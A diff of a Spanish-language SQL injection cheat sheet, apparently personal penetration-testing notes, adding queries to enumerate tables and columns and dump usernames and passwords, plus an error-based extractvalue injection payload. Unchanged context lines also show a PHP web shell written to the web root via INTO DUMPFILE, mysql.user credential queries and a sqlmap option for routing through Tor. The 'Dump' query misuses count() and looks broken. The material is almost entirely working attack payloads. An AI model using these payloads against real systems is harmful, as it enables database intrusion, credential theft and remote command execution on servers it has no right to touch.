@@ -216,6 +216,17 @@ Ponemos ' o ; y si es vulnerable, a probar
 SELECT * FROM mysql.user
 SELECT User from mysql.user
 
+concat_ws(':',id, username, password)
+
+Getting tables in current Database
+	select table_name from information_schema.tables where table_schema=database() limit 0,1
+Columns
+	select column_name from information_schema.columns where table_schema=database() and table_name='users' limit 0,1
+Count number of columns
+	select count(username) from users
+Dump
+	select count(username,0x3a,password) from users limit 0,1
+
 Enumeración de columnas:
 ' having 1=1-- al no tener el group by, dará error y puede mostrar la columna. Después hacemos ' group by [tabla.columna mostrada] having 1=1-- y mostrará la siguiente. Después concatenamos ' group by [tabla.columna mostrada], [tabla.columna mostrada2] having 1=1-- Hasta que no dé error
 Enumeración de tipos de columnas:
@@ -228,6 +239,9 @@ SELECT "<?php passthru($_GET['cmd']); ?>" into dumpfile '/var/www/html/shell.php
 SQL Injection en Where (UPDATE o DELETE, muestra la salida en el error que aparece):
 	en el parámetro vulnerable: param=extractvalue(0x0a,concat(0x0a,(select+table_name+from+information_schema.tables))%0d%0a
 	+limit+X,1) si devuelve más de una columna y da error
+	view=-35" and extractvalue(0x0a,concat(0x0a,(select database())))--
+	https://www.exploit-db.com/docs/33253
+	
 
 #SQLMAP
 Importante --tor y --check-tor
